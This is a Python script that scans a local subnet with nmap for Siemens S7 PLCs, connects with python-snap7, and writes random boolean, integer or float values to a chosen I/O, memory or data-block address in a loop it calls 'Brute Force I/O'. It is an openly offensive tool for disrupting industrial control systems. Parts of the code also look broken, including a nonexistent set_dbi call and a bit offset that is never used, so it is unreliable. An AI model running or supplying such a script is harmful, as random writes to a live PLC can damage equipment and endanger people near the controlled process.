import snap7  # For PLC communication (requires installation: pip install python-snap7)
import time   # For pausing execution
import random # For random value generation
import subprocess # For network discovery (if PLC IP is unknown)

# Configuration - Adjust these based on your environment
TARGET_POINT_TYPE = 'M'  # Memory area.  Can be 'I' (Input), 'Q' (Output), 'M' (Memory), 'DB' (Data Block)
TARGET_POINT_NUMBER = 0  # Address offset within the memory area. Example: M0.0, I1.0, Q2.0, DB1.DBW0
TARGET_POINT_BIT_OFFSET = 0 # Bit offset within the byte.  Example: M0.0 is bit 0 of byte M0.
DATA_TYPE = 'BOOL' # The data type of the I/O point. 'BOOL', 'INT', 'REAL', etc.  Important for correct reading/writing.
ITERATIONS = 100     # Number of write attempts
DELAY = 0.1         # Delay in seconds between each write (adjust as needed)

# Function to discover the PLC's IP address (using nmap)
def discover_plc_ip():
    try:
        # Scan the local network for devices running Siemens S7 protocol
        # This assumes nmap is installed and in your PATH. You may need to adapt
        # the command based on your network configuration and nmap installation.
        result = subprocess.run(['nmap', '-p', '102', '-sV', '--script', 's7-info.nse', '192.168.1.0/24'], capture_output=True, text=True) #Change the range to fit the range you are connected to

        # Parse the nmap output to find the PLC IP
        output_lines = result.stdout.splitlines()
        for line in output_lines:
            if "Siemens S7 PLC" in line:
                ip_address = line.split()[0]
                print(f"PLC IP address found: {ip_address}")
                return ip_address
        print("PLC IP address not found. Please specify it manually.")
        return None
    except FileNotFoundError:
        print("Error: nmap not found.  Please install nmap and ensure it is in your PATH.")
        return None
    except Exception as e:
        print(f"Error during PLC IP discovery: {e}")
        return None


# Function to write a value to the PLC
def write_to_plc(plc, area, byte_address, bit_address, data_type, value):
    try:
        # Prepare the data to write
        if data_type == 'BOOL':
            data = [value]  # Boolean needs to be a list of a single byte
        elif data_type == 'INT':
             data = value.to_bytes(2, byteorder='big', signed=True) # Convert to byte array
        elif data_type == 'REAL':
            import struct
            data = struct.pack('>f', value)  # Pack float into bytes
        else:
            print("Unsupported data type.")
            return

        # Determine data size based on data type
        if data_type == 'BOOL':
            size = 1 # Byte size of a boolean operation
        elif data_type == 'INT':
            size = 2 # Byte size of an integer operation
        elif data_type == 'REAL':
            size = 4 # Byte size of a real operation
        else:
            size = 1

        # Write the data to the PLC
        plc.write_area(area, 0, byte_address, data)

        print(f"Written {value} to {area}{byte_address}.{bit_address} (Type: {data_type})")

    except Exception as e:
        print(f"Error writing to PLC: {e}")


def main():
    plc_ip = discover_plc_ip()
    if not plc_ip:
        plc_ip = input("Please enter the PLC IP address: ")  # Manually get IP
        if not plc_ip:
            print("No PLC IP provided. Exiting.")
            return

    # Initialize the PLC connection
    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1.  Adjust as needed for your PLC.

    if TARGET_POINT_TYPE == 'I':
        area = snap7.const.Areas.PE
    elif TARGET_POINT_TYPE == 'Q':
        area = snap7.const.Areas.PA
    elif TARGET_POINT_TYPE == 'M':
        area = snap7.const.Areas.MK
    elif TARGET_POINT_TYPE == 'DB':
         area = snap7.const.Areas.DB
         db_number = int(input("Enter DB number: "))
         plc.set_dbi(db_number) #Must set the DB number, otherise it wont work
    else:
        print("Invalid TARGET_POINT_TYPE. Exiting.")
        plc.disconnect()
        return


    try:
        print("Starting Brute Force I/O...")
        for i in range(ITERATIONS):

            if DATA_TYPE == 'BOOL':
                #Toggle the boolean value
                value = bool(random.getrandbits(1)) # Get a random boolean value
            elif DATA_TYPE == 'INT':
                value = random.randint(-32768, 32767) # Generate a random integer within valid range
            elif DATA_TYPE == 'REAL':
                value = random.uniform(-100.0, 100.0) # Generate a random float value
            else:
                print("Unsupported data type.  Using boolean.")
                value = bool(random.getrandbits(1))
            write_to_plc(plc, area, TARGET_POINT_NUMBER, TARGET_POINT_BIT_OFFSET, DATA_TYPE, value)
            time.sleep(DELAY)

    except KeyboardInterrupt:
        print("Brute Force I/O interrupted by user.")
    finally:
        print("Disconnecting from PLC.")
        plc.disconnect()


if __name__ == "__main__":
    main()